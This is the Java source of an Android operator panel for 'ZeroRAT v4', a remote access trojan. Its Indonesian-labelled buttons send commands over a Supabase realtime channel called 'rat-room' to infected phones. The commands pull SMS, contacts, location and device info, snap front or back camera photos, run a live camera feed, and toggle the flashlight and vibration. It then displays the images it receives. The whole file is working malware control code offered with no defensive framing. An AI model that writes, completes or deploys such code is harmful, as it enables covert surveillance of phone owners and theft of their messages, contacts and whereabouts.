package com.zero.operator;
import android.app.Activity; import android.graphics.Bitmap; import android.graphics.BitmapFactory; import android.os.Bundle; import android.util.Base64; import android.view.Gravity; import android.view.ViewGroup; import android.widget.*; import org.json.JSONObject; import java.util.UUID;
public class OperatorActivity extends Activity {
    private static final String ROOM = "rat-room";
    private SupabaseRealtime rt; private TextView log; private ImageView imgView; private boolean isLiveCam = false;
    protected void onCreate(Bundle b){
        super.onCreate(b);
        LinearLayout root = new LinearLayout(this); root.setOrientation(LinearLayout.VERTICAL); root.setPadding(16,16,16,16);
        TextView title = new TextView(this); title.setText("ZeroRAT v4"); title.setTextSize(22); title.setGravity(Gravity.CENTER); root.addView(title);
        
        GridLayout grid = new GridLayout(this); grid.setColumnCount(2);
        addBtn(grid, "Info HP", "info"); addBtn(grid, "SMS", "sms"); addBtn(grid, "Kontak", "contacts"); addBtn(grid, "Lokasi", "location");
        addBtn(grid, "Foto Depan", "cam_front"); addBtn(grid, "Foto Belakang", "cam_back"); addBtn(grid, "Senter ON", "flash_on"); addBtn(grid, "Senter OFF", "flash_off");
        addBtn(grid, "Live Cam ON", "live_cam_on"); addBtn(grid, "Live Cam OFF", "live_cam_off"); addBtn(grid, "Getar", "vibrate");
        root.addView(grid);

        imgView = new ImageView(this); imgView.setLayoutParams(new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 400)); imgView.setScaleType(ImageView.ScaleType.FIT_CENTER);
        root.addView(imgView);

        ScrollView scroll = new ScrollView(this); log = new TextView(this); log.setTextSize(10); log.setText("Menghubungkan...\n"); scroll.addView(log);
        root.addView(scroll, new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f));
        setContentView(root);
        
        rt = new SupabaseRealtime(ROOM, "operator", p -> runOnUiThread(() -> {
            String type = p.optString("type");
            String b64 = p.optString("data");
            if ((type.equals("cam_front") || type.equals("cam_back")) && !b64.isEmpty()) {
                try {
                    byte[] decodedString = Base64.decode(b64, Base64.DEFAULT);
                    Bitmap decodedByte = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);
                    imgView.setImageBitmap(decodedByte);
                    log.append("\n[+] Gambar Diterima");
                } catch(Exception e){ log.append("\n[-] Gagal decode gambar"); }
            } else if(type.equals("text")) {
                log.append("\n[+] " + p.optString("data"));
            } else {
                log.append("\n["+type+"]\n"+p.toString()+"\n");
            }
        }));
        log.append("Terhubung.\n");
    }

    private void addBtn(GridLayout grid, String text, String cmd) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setOnClickListener(v -> {
            if(cmd.equals("live_cam_on")) { isLiveCam = true; log.append("\n[>] LIVE CAM ON"); }
            if(cmd.equals("live_cam_off")) { isLiveCam = false; log.append("\n[>] LIVE CAM OFF"); }
            kirim(cmd);
        });
        grid.addView(btn, new GridLayout.LayoutParams(GridLayout.spec(GridLayout.UNDEFINED, 1f), GridLayout.spec(GridLayout.UNDEFINED, 1f)));
    }

    private void kirim(String cmdStr) {
        try {
            JSONObject c = new JSONObject();
            c.put("cmd", cmdStr);
            c.put("id", UUID.randomUUID().toString());
            if(cmdStr.equals("live_cam_on") || cmdStr.equals("live_cam_off")) c.put("live", isLiveCam);
            if(cmdStr.equals("cam_front")) c.put("cam", 1);
            if(cmdStr.equals("cam_back")) c.put("cam", 0);
            rt.send("cmd", c);
            log.append("\n>> "+cmdStr);
        } catch(Exception e){}
    }
}